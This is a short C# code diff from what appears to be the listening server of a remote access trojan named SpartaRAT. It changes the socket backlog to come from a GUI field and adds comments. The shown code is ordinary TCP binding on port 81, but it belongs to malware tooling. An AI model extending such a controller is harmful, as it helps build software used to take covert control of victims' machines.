@@ -12,7 +12,7 @@ namespace RATserverSparta.Socket
 {
     public class SocketCreate
     {
-        public static dynamic Create(string IpAddressValue)
+        public static dynamic Create(string IpAddressValue, MainGUI instance)
         {
             try
             {
@@ -20,11 +20,13 @@ namespace RATserverSparta.Socket
                 System.Net.Sockets.Socket Socket = new System.Net.Sockets.Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 IPEndPoint LocalEndPoint = new IPEndPoint(IpAddress, 81); //IpAddress, Port
                 Socket.Bind(LocalEndPoint);
+                //Creating a messagebox new thread the will not block the running code
                 new Thread(() => {
                     MessageBox.Show("Server Created - " + IpAddress.ToString() + ":81" +
                 Environment.NewLine + "Notice: SpartaRAT allow listening to one ip address");
                 }).Start();
-                Socket.Listen(100);
+                //Setting Listen function with a default backlog with the 10 value
+                Socket.Listen(int.Parse(instance.listenBacklog.Text));
                 return Socket;
             }
             catch
